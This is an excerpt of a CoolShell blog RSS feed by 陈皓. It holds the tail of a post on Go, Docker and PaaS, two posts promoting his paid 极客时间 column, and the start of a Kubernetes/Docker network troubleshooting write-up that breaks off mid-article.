<p>所以，Go 语言的未来是不可限量的。当然，我个人觉得，Go 可能会吞食很多 C、C++、Java 的项目。不过，Go 语言所吞食主要的项目应该是中间层的项目，既不是非常底层也不会是业务层。</p>
<p>也就是说，Go 语言不会吞食底层到 C 和 C++ 那个级别的，也不会吞食到高层如 Java 业务层的项目。Go 语言能吞食的一定是 PaaS 上的项目，比如一些消息缓存中间件、服务发现、服务代理、控制系统、Agent、日志收集等等，没有复杂的业务场景，也到不了特别底层（如操作系统）的中间平台层的软件项目或工具。而 C 和 C++ 会被打到更底层，Java 会被打到更上层的业务层。这是我的一个判断。</p>
<p>好了，我们再用上面的标尺来量一下 Go 语言的杀手级应用 Docker，你会发现基本是一样的。</p>
<ul class="list-paddingleft-2">
<li>Docker 上手很容易。</li>
<li>Docker 解决了运维中的环境问题以及服务调度的痛点。</li>
<li>Docker 的生态圈中有大公司在后面助力。比如 Google。</li>
<li>Docker 产出了工业界标准 OCI。</li>
<li>Docker 的社区和生态圈已经出现像 Java 和 Linux 那样的态势。</li>
<li>……</li>
</ul>
<p>所以，早在 3、4 年前我就觉得 Docker 一定会是未来的技术。虽然当时的坑儿还很多，但是，相对于这些大的因素来说，那些小坑儿都不是问题。只是需要一些时间，这些小坑儿在未来 5-10 年就可以完全被填平了。</p>
<p>同样，我们可以看到 Kubernetes 作为服务和容器调度的关键技术一定会是最后的赢家。这点我在去年初就能够很明显地感觉到了。</p>
<p>关于 Docker 我还想多说几句，这是云计算中 PaaS 的关键技术，虽然，这世上在出现 Docker 之前，几乎所有的要玩公有 PaaS 的公司和产品都玩不起来，比如：Google 的 GAE，国内的各种 XAE，如淘宝的 TAE，新浪的 SAE 等。但我还是想说，<strong>PaaS 是一个被世界或是被产业界严重低估的平台。</strong></p>
<p><strong>PaaS 层是承上启下的关键技术，任何一个不重视 PaaS 的公司，其技术架构都不可能让这家公司成长为一个大型的公司</strong>。因为 PaaS 层的技术主要能解决下面这些问题。</p>
<ul class="list-paddingleft-2">
<li>
<strong>软件生产线的问题。</strong>持续集成和持续发布，以及 DevOps 中的技术必需通过 PaaS。</li>
<li>
<strong>分布式服务化的问题。</strong>分布式服务化的服务高可用、服务编排、服务调度、服务发现、服务路由，以及分布式服务化的支撑技术完全是 PaaS 的菜。</li>
<li>
<strong>提高服务的可用性 SLA。</strong>提高服务可用性 SLA 所需要的分布式、高可用的技术架构和运维工具，也是 PaaS 层提供的。</li>
<li>
<strong>软件能力的复用。</strong>软件工程中的核心就是软件能力的复用，这一点也完美地体现在 PaaS 平台的技术上。</li>
</ul>
<p>老实说，这些问题的关键程度已经到了能判断一家依托技术的公司的研发能力是否靠谱的程度。没有这些技术，依托技术拓展业务的公司几乎没有可能发展得规模很大。</p>
<p>在后面，我会在“<a href="https://time.geekbang.org/" target="_blank" rel="noopener noreferrer">极客时间</a>”<a href="https://time.geekbang.org/column/intro/48" target="_blank" rel="noopener noreferrer">我的付费专栏</a>里另外写几篇文章详细地讲一下分布式服务化和 PaaS 平台的重要程度。</p>
<p>最后，我还要说一下，为什么要早一点地进入这些新技术，而不是等待这些技术成熟了后再进入。原因有这么几个。</p>
<blockquote><p>技术的发展过程非常重要。我进入 Go 和 Docker 的技术不能算早，但也不算晚，从 2012 年学习 Go，到 2013 年学习 Docker 到今天，我清楚地看到了这两种技术的生态圈发展过程。让我收获最大的并不是这些技术本身，而是一个技术的变迁和行业的发展。</p></blockquote>
<p>从中，我看到了非常具体的各种思潮和思路，这些东西比起 Go 和 Docker 来说更有价值。因为，这不但让我重新思考我已掌握的技术以及如何更好地解决已有的问题，而且还让我看到了未来。我不但有了技术优势，而且这些知识还让我的技术生涯多了很多的可能性。</p>
<blockquote><p>这些关键新技术，可以让你拿到技术的先机。这些对一个需要技术领导力的个人或公司来说都是非常重要的。</p></blockquote>
<p>一个公司或是个人能够占有技术先机，就会比其它公司或个人有更大的影响力。一旦未来行业需求引爆，那么这个公司或是个人的影响力就会形成一个比较大的护城河，并可以快速地产生经济利益。</p>
<p>近期，在与中国移动、中国电信以及一些股份制银行进行交流的过程中，我已看到通讯行业、金融行业对于 PaaS 平台的理解已经超过了互联网公司，而我近 3 年来在这些技术上的研究让我也从中受益非浅。</p>
<p>所以，Go 语和 Docker 作为 PaaS 平台的关键技术前途是无限的，我很庆幸赶上了这个浪潮，也很庆幸在 3 年前我就看到了这个趋势，现在我也在用这些技术开发相关的技术产品，助力于为高速成长的公司提供这些关键技术。</p>
<p> </p>
<p><strong>最后注明一下：</strong></p>
<p><strong>这篇文章于上周发布于<a href="https://time.geekbang.org/column/intro/48" target="_blank" rel="noopener noreferrer">“极客时间”的我的付费专栏</a>中。极客时间中的付费是我受Geekbang邀请写的一个付费专栏，因为过去10多年给企业有过很多内训，过去2年又给好多企业做过一些咨询工作，所以，我会把一些商业化的内容写在极客时间里，当然，也会有一些我的新文章。关于这个事，我后面我专门开一篇文章说一下。（大家可以到 Apple的App Store上搜极客时间，Android版本等到12月初吧）<br>
</strong></p>
<p>（全文完）</p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2017-10-30T09:24:20+08:00</pubDate>
<guid>https://coolshell.cn/articles/18190.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 关于我”极客时间“的专栏 ]]></title>
<link>https://coolshell.cn/articles/18246.html</link>
<content><![CDATA[ 
<p><img alt="image placeholder" >不少朋友都知道我在“<a href="https://time.geekbang.org/" target="_blank" rel="noopener noreferrer">极客时间</a>”上开了一个收费专栏，这个专栏会开设大约一年的时间，一共会发布104篇文章。现在，我在上面以每周两篇文章的频率已发布了27篇文章了，也就是差不多两个半月的时间。新的一年开始了，写专栏这个事对我来说是第一次，在这个过程中有一些感想，所以，我想在这里说一下这些感受和一些相关的故事，算是一个记录，也算是对我专栏的正式介绍，还希望能得到、大家的喜欢和指点。（当然，CoolShell这边还是会持续更新的）</p>
<h4>为什么要开设一个收费专栏</h4>
<p>首先，说一下，为什么要开这个收费专栏。</p>
<p>老实说，我一开始根本就不想开收费专栏的，是的，完全不想！主要是有两个原因，一方面是我在创业中，我自然是没有太多的时间，另一方面是，我以前在《<a href="https://coolshell.cn/articles/17391.html" target="_blank" rel="noopener noreferrer">为什么我不在微信公众号上写文章</a>》也说过，我觉得知识最好的方式是被检索、讨论、引用、整理、补充和更新。所以，收费这种模式，我感觉并不利于很好的传播。但是，我为什么还干了这么一件事？这事还得从2017年6月份开始说起。</p>
<p>这个月，一共有三家技术社区来找我，都是希望我能去他们那边开收费专栏，其中一家就是“极客邦科技”。对于这三家来说，从一开始我就是以婉拒的姿态回应的。而“极客邦科技”来找我的时候和我说，一周写五篇，写一年，一共260篇。我当时心想，“去你的，当我啥呢，你们真以为技术文章好写啊”？然后，他们问我可以写多少，我说，我现在也就一个月一篇的节奏……</p>
<p><span id="more-18246"></span></p>
<p>然后，就开始了时间漫长的拉锯战。极客邦这边一直从6月份和我谈到9月份，完全就是不达目的不罢休的玩法，其间，每当我说一个问题，他们就会想出一个解，我这边不断地制造不能写下去的问题，他们就不断的给出相应的解。我其实是想让他们知难而退，另外，我也不确定这帮人对于这个事有多上心，因为写技术文章是需要非常认真的态度的，所以，我提出了很多比较苛刻的条件，甚至也很直白的直接拒绝，但是他们完全就跟没有听见似的，不断的想新的方法来让我”上床”（对！就是上床，不是上船）。</p>
<ul>
<li>我说，我最多一个月写2-3篇。他们和我说，我们看过了，你写的都是长文，都在5000字左右，一篇可以拆成上下篇，这样就有6篇左右了，然后，你每个月再来两篇文章，一篇是推荐一些资料或资源，一篇是回答读者的问题。这样就有8篇了，一周就可以发2篇了。</li>
</ul>
<ul>
<li>我说，就算是这样，我也没有时间写，我现在创业中，事多得去了，完全没精力投入。然后，他们说，不用你写，我们来帮你写。你去客户那边，叫上我们，你到大会上做分享，叫上我们，你和别人分享，也叫让我们，我们全程录音，然后帮你你整理。然后每周末的时候来找你，和你聊上2个小时。我们把内容做出来，你再精编一下就好了。而且，我们也会帮你分担创业的精力的，我们极客邦/QCon/ArchSummit会帮你的产品做推广、做市场和BD客户……</li>
</ul>
<ul>
<li>我说，就算是这样，我也没时间。他们说，我们还会给你配个编辑，一个不够就配两个，他们会帮你上网查资料，他们都是计算机专业的，一定是懂技术的。不会让你一个人写的。专栏这种事一定是会需要一个小的编辑团队的。</li>
</ul>
<p>他们还甚至在晚上10点左右跑到我家门口来和我谈。这还没完，我继续刁难他们……</p>
<ul>
<li>我说，技术文章相当专业，你们来试试看，于是，我给了一篇极其难读的英文论文，还有一篇技术细节非常晦涩的英文文章，我让他们不要翻译，而是读懂后理解完用自己的话，能够让一般人读懂的话写一下。这两篇文章，就算是对于有多年经验的程序员来说，也是很难读的。结果他们一周后，就搞好了，我读了一下，不算特别好，但是对于他们来说，已经很不错了。</li>
</ul>
<ul>
<li>我又说，我的文章中会有好些代码，有数学公式，在手机上怎么排版？阅读体验不行吧。你们还要做音频，我的文章中如果有代码，有图片，有数据公式，你让音频时怎么读？这不行吧。他们说，数学公式可以用LaTeX搞，代码排版会努力排好，同时也提供网页端的浏览。音频会这样搞，会让编辑把代码、数学公式、图片理解完后用别外的话说出来。也就是说，文章要有两个版本，一个是阅读的版本，一个是给音频师的版本。</li>
</ul>
<p>就这样，这几个月的过程中，我心里面有了一些不一样的感觉。</p>
<ul>
<li>一方面，我觉得这种“不达目的不罢休”的做法让我欣赏。因为我也在创业，创业的过程中有很多难题，也会遇到很多困难和艰辛。而极客邦他们这样的作法我是非常认可，也是非常佩服的，因为，要是换作我，我可能早放弃去寻找其它人了。但是他们没有，他们一直不断地在穷尽一切方法来说服我写专栏。能这样做的人，我觉得这个社会上少之又少，绝大多数人都是畏难和容易退缩的，所以，感觉可以深入交往和合作。</li>
</ul>
<ul>
<li>另外一方面，在整个过程中，我问他们，为什么你们要把这个事做得这么“重”？为什么不做得“轻”一点呢？还要录音频，音频对于技术型的文章里面有一堆坑啊，对于技术文章还有很多无法翻译的英文单词，在计算机的世界里，好多英文单词都是造出来的，音频师怎么读？(后来的确也是这样，我的音频师就把J2EE读成了“J二EE”)，他们的编辑也不知道怎么读，就上Youtube上找相关视频看老外是怎么发音的，然后标注好。而且，我的文章有时候写得太快，经常会有一些小错误，文字好改，但是还要改语音。对于这些，我都觉得好重啊，结果他们说，就是要做个“重的”，就是要做一个别人达不到的标杆，让竞争对手望而却步！</li>
</ul>
<p>对于这两点，是让我很赞的。这样的做事精神和态度让我很佩服，是啊，在Amazon里也常说，要不断地提高标准。而且这让我深入思考了一下，一个事如果想要做好，做到极致，就算再简单的事，也会变成复杂，<strong>这个世界上可能并不存在“轻模式”，只要你想做好，再“轻”的事都会变“重”</strong>。他们的这些做法，让我有了一种同道中人的感觉，人总是会向比自己强的人或是跟自己比较像的人靠近的。我感觉我在创业路上，就是要和这样的人在一起，面对再难的事，都要想尽一切办法解决之，面对再轻的事，都要花心思用重的模式去做好。</p>
<p>而其它两个来找我做同样的事的公司，却没有让我看到他们有这样把事做成的不服输的决心和态度，真是形成了强烈的反差和对比。</p>
<p>于是，我就这样“从”了！这里要点名一下极客邦的两个人——我叫他们作“双蕾”：<strong>司巧蕾</strong> 和 <strong>郭蕾</strong>。（池大大也为极客时间付出了好多，因为大家都认识他了，我就弱化他一下了，嘿嘿）</p>
<h4>这个专栏主要会写什么样的内容</h4>
<p>这是一个收费专栏，一旦收费了，我的压力也大了，因为你要写的内容就一定要能达到可以收费的价值了，不以再像个人博客一样，想写什么就什么。好在我从2003年开始我就在给好多企业做一些商业化的讲座和培训，也给一些公司做过一些商业的咨询和技术方案，包括在过去两年内帮助过一些公司打单。另外，在过去的10年内，我也在技术、职业和成长上帮助过很多年轻人。这些内容，我都没有完整或是具体地写在CoolShell中，所以，我觉得这些内容是可以放在这个收费专栏的。</p>
<p>此外，我在CoolShell上的文章都是不系统的，是碎片式的，还有一些只是知识，还不是认识。而我过去成长的20年，我的经验和知识已经在某些方面形成了比较完整的体系，而且有一些技术也能看到本质上的东西。所以，我觉得这些东西是可以呈现在这个专栏内的，都是非常有商业价值的，一定是可以帮助到大家的。当然，其中的一些东西，不是初级入门的程序员能够看懂的，需要有一定的工作经验和基础知识。</p>
<p>而在我入行的这20年来，我觉得对于一个企业，一个团队，一个个体的程序员来说，有三件事是密不可分，也是相辅相成的，这三件事就是：技术、发展和管理。每个人，每个团队，每个企业，都需要认真地面对技术，不断地挑战新的技术，并且还要非常认真地发展个人和团队，而这些都需要对自我的管理或是对团队和公司的管理才能更高效的达成。</p>
<p>所以，我的专栏会由这三部份构成:</p>
<ul>
<li>
<strong>技术</strong>。对于技术方面，我不会写太多关于知识点的东西，因为这些知识点大家可以自行Google可以RTFM。我要写就一定是以体系化的，而且要能直达技术的本质。我入行这20年来，我最擅长的是针对各种大规模的系统，所以，我会有2-3个和分布式系统相关的系列文章，然后，我学过也用过好多编程语言，所以，我也会有一系列的关于编程本质的文章，而我对一些基础知识研究的也比较多，所以，还会有一系列的和基础知识相关的文章。当然，其中还会穿插一些其它的技术文章，比如一些热点事件，还有一些经验之谈，包括，我会把我的《<a href="https://coolshell.cn/articles/4990.html" target="_blank" rel="noopener noreferrer">程序员技术练级攻略</a>》在这个专栏里重新再写一遍。这些东西一定会让大家有醍醐灌顶的感觉。</li>
</ul>
<ul>
<li>
<strong>成长</strong>。在过去这20年中，我感觉得到，很多人都会非常在意自己的成长。所以，我会分享一堆我亲身经历的，也是我自己实验的一定和个人发展相关的文章。比如，像技术变现啊、如何面试、如何选择新的技术、如何学习、如何管理自己的时间、如何管理自己的老板和工作、如何成为一个Leader……这些东西一定会对大家有用。但是，我这里一定不会有速成的东西。一切都是要花时间和精力的。如果你想要速成，你不应该来订阅我的专栏。</li>
</ul>
<ul>
<li>
<strong>管理</strong>。这20年，我觉得做好技术工作，得做好技术的管理工作，只有管理好了软件工程和技术团队，技术才能发挥出最大的潜力。大多数的技术都是管理上的问题。所以，我会写上一系列的和管理相关的文章，管理三个要素，团队、项目和管理者自己。所以，我会从这三个方面写一系列包括，人员招聘、绩效考核、提升士气、解决冲突、面对变化、沟通说服、项目管理、任何排期、会议、远程管理……等等一系列的文章。这些东西都是我在外企时，接受到的世界顶级管理培训机构培训内容，我会把我的实践写出来分享给大家。这其中一定少不了亚马逊相关的各种实践。这些东西，我和很多公司和大佬都讲过，到目前为止还没有人不赞的。</li>
</ul>
<p>现在，我这个专栏写了快三个月了，第一部分和第二部分已经有一些呈现了。我周末和假期的时间也完全都搭进去了 ;-)。后面的文章还在和我的编辑一起在整理和书写中，我感觉这个专栏只收199一年简直是太便宜了，我有点想涨价的冲动了。哈哈。</p>
<h4>幕后团队</h4>
<p>最后说一下我的专栏编辑——她叫杨爽！以前是CSDN的程序员杂志的编辑，后来去了七牛，现在和我一起做我的这个专栏。她对我的这个专栏上的投入非常大，除了帮助我编辑文章，还要帮音频师标注语气，英文发音，以及音频版的文章，还要深度参与写作，<strong>有的文章我只给了一个大纲，甚至只是一个方向，或是一系列的素材，然后都是她来操刀的，比如“推荐阅读”的文章、还有技术领导力的下篇，基本上是由杨爽来出第一版，然后我再上面再做修改和补充</strong>。她说，写技术文章真是太累了，尤其是帮你编辑你的分布式系列的文章，我基本都把这些技术都看了个大概了。我调侃到，如果你完全搞懂了，你就不用做编辑了，你可以做技术去了，嗯，而且，可以变成架构师了。</p>
<p>另外，她会深度的编辑我的文章，尤其是每篇文章最后的一些总结或是一些问题都是她写的。在我的一篇答疑的文章中，她自己加入了一个观点——“很多事情能做到什么程度，其实在思想的源头就被决定了，因为它会绝大程度地受到思考问题出发点、思维方式、格局观、价值观等因素的影响”，这个观点被读者当成是我的观点，其实，这是杨爽的观点，当然我也很同意。</p>
<p>所以，我的这个专栏离不开杨爽的付出，我和她一般都是在晚上或是周末沟通，因为平时我的时候都被创业的事给占据了。所以，她也只能适配我的时间，但她真的很努力，我能感觉得到她想把文章的质量不断提高的迫切。</p>
<p>关于专栏的音频师，他叫柴巍，是天津广播电台的主持人，一个89年的小伙子，网上他的<a href="http://www.radiotj.com/zcrdd/system/2014/04/16/000472670.shtml" target="_blank" rel="noopener noreferrer">个人信息在这里</a>。他跨界来读这些技术文章的确对他来说非常不容易，因为一方面这文章里讲的这些东西他都看不懂，另外，他也不认识我，我脾气和性格他不知道，所以，他读我的文章里，并不能完全准确地把握相关的语气。这就需要杨爽来帮他标注和调整，有些地方，不断地修改，不断地录，大家知道，录音和写文章不一样，文章要修改很简单，语音要修改就非常麻烦，得把上下文全都一并重新再读一篇，这个过程的确难，杨爽在其中也花费了大量的时间和这个小伙子沟通和调整。</p>
<p>在一开始，有播音腔，也被读者吐槽了，他自己后来一直在调整，目前越来越符合咱们的要求。这个小哥是非常努力和有挑战精神的，他在这个过程中，也是非常信守承诺的。去年12月6日，录分布式系统冰与火那篇文章时，他上午有自己的工作，下午要开会，晚上又有单位活动，他还是活动的主持人，他实在是没有时间了。我也和我的编辑说，算了，先发文章，后面再补音频。但是他还是挤时间把音频录出来了，期间，我还不知情地又修改了一下文章，他又配合修改，直到完全改好。打车去参加活动，还好提前20分钟赶到，没有耽误主持活动。</p>
<p>唠唠叨叨写这么多，也没什么干货！算是一份记录吧。也希望大家能够从我的专栏中看到这个团队的确是在用心做事的，是的，能认识这些人，还能一起合作，在我的人生经历上是非常有价值的事了。</p>
<p>希望大家在新的一年里也能遇到这样的人。我们一起加油！</p>
<p><img alt="image placeholder" ></p>
<p style="text-align: center;">图片来自：电影《速度与激情》——Ride or Die</p>
<p> </p>
<p>（全文完）</p>
<p> </p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2018-01-02T16:56:11+08:00</pubDate>
<guid>https://coolshell.cn/articles/18246.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 程序员练级攻略（2018) 与我的专栏 ]]></title>
<link>https://coolshell.cn/articles/18360.html</link>
<content><![CDATA[ 
<p><img alt="image placeholder" >写极客时间8个月了，我的专栏现在有一定的积累了，今天想自己推荐一下。因为最新的系列《程序员练级攻略（2018）版》正在连载中，而且文章积累量到了我也有比较足的自信向大家推荐我的这个专栏了。推荐就从最新的这一系统的文章开始。</p>
<p>2011年，我在 <a href="https://coolshell.cn/">CoolShell</a> 上发表了 《<a href="https://coolshell.cn/articles/4990.html">程序员技术练级攻略</a>》一文，得到了很多人的好评（转载的不算，在我的网站上都有近1000W的访问量了）。并且陆续收到了一些人的反馈，说跟着这篇文章找到了不错的工作。几年过去，也收到了好些邮件和私信，希望我把这篇文章更新一下，因为他们觉得有点落伍了。是的，<strong>老实说，抛开这几年技术的更新迭代不说，那篇文章写得也不算特别系统，同时标准也有点低，当时是给一个想要入门的朋友写的，所以，非常有必要从头更新一下《程序员练级攻略》这一主题</strong>。</p>
<p>目前，我在我极客时间的专栏上更新《程序员练级攻略（2018版）》。升级版的《程序员练级攻略》会比Coolshell上的内容更多，也更专业。这篇文章有【入门篇】、【修养篇】、【专业基础篇】、【软件设计篇】、【高手成长篇】五大篇章，它们会帮助你从零开始，一步步地，系统地，从陌生到熟悉，到理解掌握，从编码到设计再到架构，从码农到程序员再到工程师再到架构师的一步一步进阶，完成从普通到精通到卓越的完美转身……</p>
<p>这篇文章是我写得最累也是最痛苦的文章，原因如下：</p>
<ul>
<li> <strong>学习路径的梳理</strong>。这是一份计算编程相关知识地图，也是一份成长和学习路径。所以有太多的推敲了，知识的路径，体，地图……这让我费了很多工夫，感觉像在编写一本教材一样，即不能太高大上，也不能误人子弟。</li>
<li>
<strong>新旧知识的取舍。</strong>另外，因为我的成长经历中很多技术都成了过去时，所以对于新时代的程序员应该学习新的技术，然后，很多基础技术在今天依然管用，所以，在这点上，哪些要那些不要，也花了我很多的工夫。</li>
<li>
<strong>文章书籍的推荐</strong>。为了推荐最好的学习资料和资源，老实说，我几乎翻遍了整个互联网，进行了大量的阅读和比较。这个过程让我也受益非浅。一开始，这篇文章的大小居然在500K左右，太多的信息就是没有信息，所以在信息的筛选上我花费了很多的工夫，删掉了60%的内容。但是，依然很宠大。</li>
</ul>
<p><strong>总之，你一定会被这篇文章的内容所吓到的，是的，我就是故意这样做的，因为，这本来就没有什么捷径，也不可能速成，很多知识都是硬骨头，你只能一口一口的啃，我故意这样做就是为了让你不要有“速成”的幻想，也可以轻而一举的吓退那些不想用功不想努力的人</strong>。</p>
<p>但是，我们也要知道《易经》有云：“<strong>取法其上，得乎其中，取法其中，得乎其下，取法其下，法不得也</strong>”。所以，我这里会给你立个比较高标准，你要努力达到，相信我，就算是达不到，也会比你一开始期望的要高很多……</p>
<p>下面是这份练级攻略的目录，目前只在极客时间上发布，你需要付费阅读（在本文最后有相关的二维码）。</p>
<p><span id="more-18360"></span></p>
<p><img alt="image placeholder" ></p>
<p> </p>
<p>那么，除程序员练级攻略外，我还写了哪些内容？下面是迄今为止我所有的文章的目录。你可以在下面看一下相关的目录。这也算是我开收费专栏来8个月给大家的一份答卷吧。我也没有想到，我居然写了这么多的文章，而且对很多人都很有用。</p>
<p>首先是个人成长和经验之谈的东西，在这里的文章还没有完全更新完，未来要更新什么我也不清楚，但是可以呈现出来的内容和方向如下所示，供你参考。对于个人成长中的内容，都是我多年来的心得和体会，从读者的反馈来看是非常不错的，你一定要要阅读的。</p>
<p><img alt="image placeholder" ></p>
<p>分布式系统架构，我一共出了两个系列，一个是分布式系统架构的本质，另一个是设计模式。前者偏概念，后者偏技术。这里旨在让你看到整个分布式系统设计的一个非常系统的蓝图，但是因为在手机端上，不可能写得非常细，所以，会缺失一些细节，这些细节我是故意缺失的，主要是有几方面的原因，</p>
<ul>
<li>一方面，这是为了阅读的效果，手机上的文章不过长，所以，不能有太多的细节。</li>
<li>另一方面，也是是想留给大家自行学习，而不是一定要我把饭喂到你的嘴里，你才能吃得着。<strong>学习不只是为要答案，而是学方法</strong>
</li>
<li>最后是我的私心，因为我也在创业，所以，技术细节上东西正是我在做的产品，所以，如果你想了解得更细，你需要和我有更商业合作。</li>
</ul>
<p><img alt="image placeholder" ></p>
<p> </p>
<p><img alt="image placeholder" ></p>
<p><img alt="image placeholder" ></p>
<p><img alt="image placeholder" ></p>
<p>区块链的技术专栏本来不在我的写作计划中的，但是因为来问我这方面的技术人太多了，所以，就被问了一系列的文章，这里的文章除了一些技术上的科普，同样有有很多我的观点，你不但可以学到技术，还可以了解一些金融知识和相关的逻辑，我个人觉得这篇文章是让你有独立思考的文章。</p>
<p><img alt="image placeholder" ></p>
<p>我的专栏还在继续，接下来还有一个系列的文章——《从技术到管理》，欢迎关注，也欢迎扫码订阅。</p>
<p><strong>最后友情提示一下：在手机上学习并不是最好的学习方式，也不要在我的专栏上进行学习，把我的专栏当成一个你的助手，当成一个向导，当成一个跳板，真正的学习还是要在线下，专心的，系统地、有讨论地、不断实践地学习，这点希望大家切记！</strong></p>
<p> </p>
<p><img alt="image placeholder" ></p>
<p>（全文完）</p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2018-05-29T12:38:23+08:00</pubDate>
<guid>https://coolshell.cn/articles/18360.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 记一次Kubernetes/Docker网络排障 ]]></title>
<link>https://coolshell.cn/articles/18654.html</link>
<content><![CDATA[ 
<p><img alt="image placeholder" >昨天周五晚上，临下班的时候，用户给我们报了一个比较怪异的Kubernetes集群下的网络不能正常访问的问题，让我们帮助查看一下，我们从下午5点半左右一直跟进到晚上十点左右，在远程不能访问用户机器只能远程遥控用户的情况找到了的问题。这个问题比较有意思，我个人觉得其中的调查用到的的命令以及排障的一些方法可以分享一下，所以写下了这篇文章。</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E9%97%AE%E9%A2%98%E7%9A%84%E7%97%87%E7%8A%B6" title="问题的症状">问题的症状</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4">
<a class="ez-toc-link ez-toc-heading-2" href="#%E9%97%AE%E9%A2%98%E7%9A%84%E6%8E%92%E6%9F%A5" title="问题的排查">问题的排查</a><ul class="ez-toc-list-level-5">
<li class="ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-3" href="#%E9%97%AE%E9%A2%98%E5%88%9D%E6%9F%A5" title="问题初查">问题初查</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-4" href="#%E9%87%8D%E6%96%B0%E6%A2%B3%E7%90%86" title="重新梳理">重新梳理</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-5" href="#%E6%9F%B3%E6%9A%97%E8%8A%B1%E6%98%8E" title="柳暗花明">柳暗花明</a></li>
</ul>
</li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-6" href="#%E6%80%BB%E7%BB%93" title="总结">总结</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-7" href="#%E9%97%AE%E9%A2%98%E5%8E%9F%E5%9B%A0" title="问题原因">问题原因</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-8" href="#%E5%85%B6%E5%AE%83%E4%BA%8B%E5%AE%9C" title="其它事宜">其它事宜</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E9%97%AE%E9%A2%98%E7%9A%84%E7%97%87%E7%8A%B6"></span>问题的症状<span class="ez-toc-section-end"></span>
</h4>
<p>用户直接在微信里说，他们发现在Kuberbnetes下的某个pod被重启了几百次甚至上千次，于是开启调查这个pod，发现上面的服务时而能够访问，时而不能访问，也就是有一定概率不能访问，不知道是什么原因。而且并不是所有的pod出问题，而只是特定的一两个pod出了网络访问的问题。用户说这个pod运行着Java程序，为了排除是Java的问题，用户用 <code>docker exec -it</code> 命令直接到容器内启了一个 Python的 SimpleHttpServer来测试发现也是一样的问题。</p>
<p>我们大概知道用户的集群是这样的版本，Kuberbnetes 是1.7，网络用的是flannel的gw模式，Docker版本未知，操作系统CentOS 7.4，直接在物理机上跑docker，物理的配置很高，512GB内存，若干CPU核，上面运行着几百个Docker容器。</p>
<p><span id="more-18654"></span></p>
<h4>
<span class="ez-toc-section" id="%E9%97%AE%E9%A2%98%E7%9A%84%E6%8E%92%E6%9F%A5"></span>问题的排查<span class="ez-toc-section-end"></span>
</h4>
<h5>
<span class="ez-toc-section" id="%E9%97%AE%E9%A2%98%E5%88%9D%E6%9F%A5"></span>问题初查<span class="ez-toc-section-end"></span>
</h5>
<p>首先，我们排除了flannel的问题，因为整个集群的网络通信都正常，只有特定的某一两个pod有问题。而用 <code>telnet ip port</code> 的命令手工测试网络连接时有很大的概率出现 <code>connection refused</code> 错误，大约 1/4的概率，而3/4的情况下是可以正常连接的。</p>
<p>当时，我们让用户抓个包看看，然后，用户抓到了有问题的TCP连接是收到了 <code>SYN</code> 后，立即返回了 <code>RST, ACK</code></p>
<p><img alt="image placeholder" ></p>
<p>我问一下用户这两个IP所在的位置，知道了，<code>10.233.14.129</code> 是 <code>docker0</code>，<code>10.233.14.145</code> 是容器内的IP。所以，这基本上可以排除了所有和kubernets或是flannel的问题，这就是本地的Docker上的网络的问题。</p>
<p>对于这样被直接 Reset 的情况，在 <code>telnet</code> 上会显示 <code>connection refused</code> 的错误信息，对于我个人的经验，这种 <code>SYN</code>完直接返回 <code>RST, ACK</code>的情况只会有三种情况：</p>
<ol>
<li> TCP链接不能建立，不能建立连接的原因基本上是标识一条TCP链接的那五元组不能完成，绝大多数情况都是服务端没有相关的端口号。</li>
<li>TCP链接建错误，有可能是因为修改了一些TCP参数，尤其是那些默认是关闭的参数，因为这些参数会导致TCP协议不完整。</li>
<li>有防火墙iptables的设置，其中有 <code>REJECT</code> 规则。</li>
</ol>
<p>因为当时还在开车，在等红灯的时候，我感觉到有点像 NAT 的网络中服务端开启了 <code>tcp_tw_recycle</code> 和 <code>tcp_tw_reuse</code> 的症况（详细参看《<a href="https://coolshell.cn/articles/11564.html" target="_blank" rel="noopener noreferrer">TCP的那些事（上）</a>》），所以，让用户查看了一上TCP参数，发现用户一个TCP的参数都没有改，全是默认的，于是我们排除了TCP参数的问题。</p>
<p>然后，我也不觉得容器内还会设置上iptables，而且如果有那就是100%的问题，不会时好时坏。所以，我怀疑容器内的端口号没有侦听上，但是马上又好了，这可能会是应用的问题。于是我让用户那边看一下，应用的日志，并用 <code>kublet describe</code>看一下运行的情况，并把宿主机的 iptables 看一下。</p>
<p>然而，我们发现并没有任何的问题。这时，<strong>我们失去了所有的调查线索，感觉不能继续下去了……</strong></p>
<h5>
<span class="ez-toc-section" id="%E9%87%8D%E6%96%B0%E6%A2%B3%E7%90%86"></span>重新梳理<span class="ez-toc-section-end"></span>
</h5>
